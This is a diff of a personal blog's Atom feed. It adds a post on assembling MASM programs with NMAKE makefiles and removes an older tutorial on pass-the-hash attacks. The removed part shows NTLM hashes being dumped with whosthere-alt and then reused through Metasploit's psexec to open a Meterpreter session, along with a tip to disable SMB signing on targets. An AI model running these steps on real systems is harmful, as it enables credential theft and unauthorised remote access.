@@ -4,13 +4,138 @@
  <title>Madhur's Blog</title>
  <link href="http://madhur.co.in/atom.xml" rel="self"/>
  <link href="http://madhur.co.in/blogindex.html/"/>
- <updated>2012-02-03T08:32:45+05:30</updated>
+ <updated>2012-02-09T01:14:35+05:30</updated>
  <id>http://madhur.co.in/blogindex.html</id>
  <author>
    <name>Madhur Ahuja</name>
    <email>ahuja.madhur@gmail.com</email>
  </author>
  
+ 
+ <entry>
+   <title>Using MakeFile with Assembly Programming</title>
+   <link href="http://madhur.co.in/blog/2012/02/08/makefileassembly.html"/>
+   <updated>2012-02-08T00:00:00+05:30</updated>
+   <id>id:/blog/2012/02/08/makefileassembly</id>
+   <content type="html">&lt;p&gt;I have been a big fan of assembly programming since my old school days. The raw power of CPU which you get is just pure awesome. But, with that power, you also get much headache of non-availablity of standard IDE&amp;#8217;s for using Assembly language.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Visual Studio is one of the options, but it restricts you to the installed version of Microsoft Macro Assembler (ml.exe)&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;Some prefer using QEditor.exe which ships with &lt;a href='http://masm32.com'&gt;MASM32 SDK&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li&gt;
+&lt;p&gt;Some like me, just cannot stay away from there favourite editors such as Notepad++, Ultraedit etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The benefit of using editors such as Notepad++, Ultraedit is that you get fully customizable syntax highlighting and command line tools to be used while assembling and linking their programs. However, with these tools you have to add commands to both assemble and link your programs. And if you are like me, who fiddles with 16bit, 32bit and 64 bit assembly programs, you have to add seperate commands for them. And not to forget, seperate commands for outputting debug and release binaries as well.&lt;/p&gt;
+
+&lt;p&gt;To simplify the above process, I have been exploring the use of makefiles to assemble and link my programs and this has worked wonderfully well. I just maintain my each assembly project in seperate directory with the makefile and use that as a command to assembly and link the program from &lt;span&gt;Notepad++&lt;/span&gt;, using &lt;span&gt;NppExec plugin&lt;/span&gt;. Apart from Notepad++, I am using following tools as my development environment. You might be using different, but they can be applied in same concept.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;NMAKE(nmake.exe) v10.00.30319.01 which ships with Visual Studio 2010 available &lt;a href='http://www.microsoft.com/visualstudio/en-in'&gt;here&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;Borland Resource compiler (brcc32.exe) v4.50 which ships with Borland compiler tools available somewhere on the net&lt;/li&gt;
+
+&lt;li&gt;Microsoft Macro Assembler(ml.exe) v6.14 and Linker (link.exe) v5.12 which ships with Masm 32 SDK available &lt;a href='http://www.masm32.com/'&gt;here&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Note that all the above tools should be put preferable in the PATH variable for easy access. I do this by creating a simple command script as follows:&lt;/p&gt;
+&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;setx PATH &amp;quot;f:\common tools\git\bin;f:\common tools\python\app;f:\common tools\python\app\scripts;f:\common tools\ruby\bin;f:\masm32\bin;F:\Borland\BCC55\Bin;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;I am going to show you some scenarios here on how I am using Makefiles to assemble and link my programs. Note that this is not a tutorial for using makefiles. I assume you have some basic familiarity with it. If not, you can browse some excellent tutorials &lt;a href='http://web.sau.edu/lilliskevinm/csci240/masmdocs/envtools/26LMAETC16.pdf'&gt;here&lt;/a&gt; and &lt;a href='http://webster.cs.ucr.edu/AoA/DOS/ch08/CH08-10.html#HEADING10-131'&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;A Win32 Assembly program without the use of resources:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='makefile'&gt;&lt;span class='nv'&gt;MASMPATH&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;F:&lt;span class='se'&gt;\M&lt;/span&gt;ASM32
+&lt;span class='nv'&gt;ML&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;ml
+&lt;span class='nv'&gt;DEBUG&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; 1
+!IF &lt;span class='k'&gt;$(&lt;/span&gt;DEBUG&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='o'&gt;==&lt;/span&gt;1
+&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Zd /Zi /Fl /Sn /nologo /I
+!ELSE
+&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Fl /Sn /nologo /I
+!ENDIF
+&lt;span class='nv'&gt;LDFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;
+&lt;span class='nv'&gt;SOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;trans.asm
+&lt;span class='nv'&gt;OBJECTS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='k'&gt;$(&lt;/span&gt;SOURCES:.asm&lt;span class='o'&gt;=&lt;/span&gt;.obj&lt;span class='k'&gt;)&lt;/span&gt;
+&lt;span class='nv'&gt;PROJ&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;trans.exe
+
+
+&lt;span class='k'&gt;$(&lt;/span&gt;PROJ&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
+	link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:&lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\L&lt;/span&gt;IB &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
+	
+&lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt;
+	&lt;span class='k'&gt;$(&lt;/span&gt;ML&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;CFLAGS&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\i&lt;/span&gt;nclude &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt; 
+	
+clean:
+	del *.exe
+	del *.obj
+	del *.lst
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;A win32 Assembly program with the use of resources:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='makefile'&gt;&lt;span class='nv'&gt;MASMPATH&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;F:&lt;span class='se'&gt;\M&lt;/span&gt;ASM32
+&lt;span class='nv'&gt;ML&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;ml
+&lt;span class='nv'&gt;DEBUG&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; 1
+!IF &lt;span class='k'&gt;$(&lt;/span&gt;DEBUG&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='o'&gt;==&lt;/span&gt;1
+&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Zd /Zi /Fl /Sn /nologo /I
+!ELSE
+&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Fl /Sn /nologo /I
+!ENDIF
+&lt;span class='nv'&gt;LDFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;
+&lt;span class='nv'&gt;SOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.asm
+&lt;span class='nv'&gt;RESOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.rc
+&lt;span class='nv'&gt;OBJECTS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='k'&gt;$(&lt;/span&gt;SOURCES:.asm&lt;span class='o'&gt;=&lt;/span&gt;.obj&lt;span class='k'&gt;)&lt;/span&gt; vaoffset.res
+&lt;span class='nv'&gt;PROJ&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.exe
+
+
+&lt;span class='k'&gt;$(&lt;/span&gt;PROJ&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
+	link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:&lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\L&lt;/span&gt;IB /LIBPATH:f:&lt;span class='se'&gt;\p&lt;/span&gt;rojects&lt;span class='se'&gt;\p&lt;/span&gt;rograms&lt;span class='se'&gt;\w&lt;/span&gt;insock&lt;span class='se'&gt;\n&lt;/span&gt;etsend &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
+	
+&lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt;
+	&lt;span class='k'&gt;$(&lt;/span&gt;ML&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;CFLAGS&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\i&lt;/span&gt;nclude &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt; 
+	C:&lt;span class='se'&gt;\B&lt;/span&gt;orland&lt;span class='se'&gt;\B&lt;/span&gt;CC55&lt;span class='se'&gt;\B&lt;/span&gt;in&lt;span class='se'&gt;\b&lt;/span&gt;rcc32.exe vaoffset.rc
+	
+	
+clean:
+	del *.exe
+	del *.obj
+	del *.lst
+	
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Now, Provided &lt;strong&gt;NMAKE&lt;/strong&gt; is in your path variable, you can simply set a command in Notepad++ or in your favourite text editor to invoke nmake in current directory.&lt;/p&gt;
+&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;F:\projects\programs\WIN32ASM\transparent&amp;gt;nmake /U
+
+Microsoft (R) Program Maintenance Utility Version 10.00.30319.01
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+        ml /c /coff /Zd /Zi /Fl /Sn /nologo /I F:\MASM32\include trans.asm
+ Assembling: trans.asm
+        link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:F:\MASM32\LIB trans.obj
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And to clean the output,&lt;/p&gt;
+&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;F:\projects\programs\WIN32ASM\transparent&amp;gt;nmake clean
+
+Microsoft (R) Program Maintenance Utility Version 10.00.30319.01
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+        del *.exe
+        del *.obj
+        del *.lst		
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;</content>
+ </entry>
  
  <entry>
    <title>Updated with Blueprint CSS Framework</title>
@@ -980,93 +1105,6 @@ Loaded 1 password hash (NT MD4 [128/128 SSE2 + 32/32])
 &lt;li&gt;&lt;a href='http://yaml.codeplex.com/'&gt;http://yaml.codeplex.com/&lt;/a&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;a href='http://yaml-net-parser.sourceforge.net/'&gt;http://yaml-net-parser.sourceforge.net/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content>
- </entry>
- 
- <entry>
-   <title>Pass the Hash Exploitation on Windows</title>
-   <link href="http://madhur.co.in/blog/2011/08/16/passthehash.html"/>
-   <updated>2011-08-16T00:00:00+05:30</updated>
-   <id>id:/blog/2011/08/16/passthehash</id>
-   <content type="html">&lt;p&gt;A Windows 2000/NT/XP/Vista/7 system can be compromised with a technique called &lt;a href='http://en.wikipedia.org/wiki/Pass_the_hash'&gt;pass the Hash&lt;/a&gt;. For us to exploit this technique, we must know some basica.&lt;/p&gt;
-
-&lt;p&gt;In a Windows based authentication such as NTLM or Kerberos, the password is never sent as cleartext. Instead the password is transformed into a hash(LM or NTLM Hash) and then sent to the server. The server then compares this hash against the stored hash and grants/denies the access.&lt;/p&gt;
-
-&lt;p&gt;There are two types of hashes:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href='http://en.wikipedia.org/wiki/LM_hash'&gt;LM hash, LanMan, or LAN Manager hash&lt;/a&gt;: It is the obsolete hashing algorithm. Refer to the link to see how it is computed.&lt;/li&gt;
-
-&lt;li&gt;NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Whenever a domain user logs on to the client computer, the hash of its password is stored on the client so that user can be authenticated in future even if the domain controller is not available. There are two types of caching, which is mentioned &lt;a href='http://support.microsoft.com/kb/913485'&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Now lets suppose, somebody has used your office laptop to log in and access some intranet based sites. Then that user&amp;#8217;s password hash is stored in your system.&lt;/p&gt;
-
-&lt;p&gt;You can retrieve these hashes using a utility such as &lt;a href='http://oss.coresecurity.com/projects/pshtoolkit.htm'&gt;PSH Toolkit&lt;/a&gt;. It contains a utility &lt;strong&gt;whosthere&lt;/strong&gt; which can dump the hashes.&lt;/p&gt;
-&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt&amp;gt;whosthere-alt.exe
-WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com)
- - (c) 2007-2008 Core Security Technologies
-This tool lists the active LSA logon sessions with NTLM credentials.
-use -h for help.
-the output format is: username:domain:lmhash:nthash
-
-madhur:BACKTRACK:123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
-BACKTRACK$:WORKGROUP:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Once you have grabbed the hash, you can anytime compromise the victim&amp;#8217;s computer using metaspoilt&amp;#8217;s psexec module, if you know the IP address, which is not difficult considering an intranet evnironment.&lt;/p&gt;
-&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;msf exploit(psexec) &amp;gt; use windows/smb/psexec
-msf exploit(psexec) &amp;gt; set RHOST 192.168.0.13
-RHOST =&amp;gt; 192.168.0.13
-msf exploit(psexec) &amp;gt; set LHOST 192.168.0.14
-LHOST =&amp;gt; 192.168.0.14
-msf exploit(psexec) &amp;gt; set SMBDomain backtrack
-SMBDomain =&amp;gt; backtrack
-msf exploit(psexec) &amp;gt; set SMBUser madhur
-SMBUser =&amp;gt; madhur
-msf exploit(psexec) &amp;gt; set SMBPass 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
-SMBPass =&amp;gt; 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
-msf exploit(psexec) &amp;gt; exploit
-
-[*] Started reverse handler on 192.168.0.13:4444 
-[*] Connecting to the server...
-[*] Authenticating to 192.168.0.14:445|backtrack as user &amp;#39;madhur&amp;#39;...
-[*] Uploading payload...
-[*] Created \wttVwMnA.exe...
-[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
-[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
-[*] Obtaining a service manager handle...
-[*] Creating a new service (nkgYMOZy - &amp;quot;MrDoYCoO&amp;quot;)...
-[*] Closing service handle...
-[*] Opening service...
-[*] Starting the service...
-[*] Removing the service...
-[*] Closing service handle...
-[*] Deleting \wttVwMnA.exe...
-[*] Sending stage (749056 bytes) to 192.168.0.14
-[*] Meterpreter session 6 opened (192.168.0.13:4444 -&amp;gt; 192.168.0.14:1035) at 2011-08-16 22:16:47 +0530
-
-meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;If you have trouble exploiting the target system, then it might be some security enabled your Administrator. For ex&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Simple file sharing is disabled (Windows XP)&lt;/li&gt;
-
-&lt;li&gt;Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)&lt;/li&gt;
-
-&lt;li&gt;&amp;#8220;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters&amp;#8221; on the target systems and setting the value of &amp;#8220;RequireSecuritySignature&amp;#8221; to &amp;#8220;0&amp;#8221;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;References:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href='http://oss.coresecurity.com/pshtoolkit/doc/index.html'&gt;http://oss.coresecurity.com/pshtoolkit/doc/index.html&lt;/a&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;a href='https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html'&gt;https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;</content>
  </entry>
  
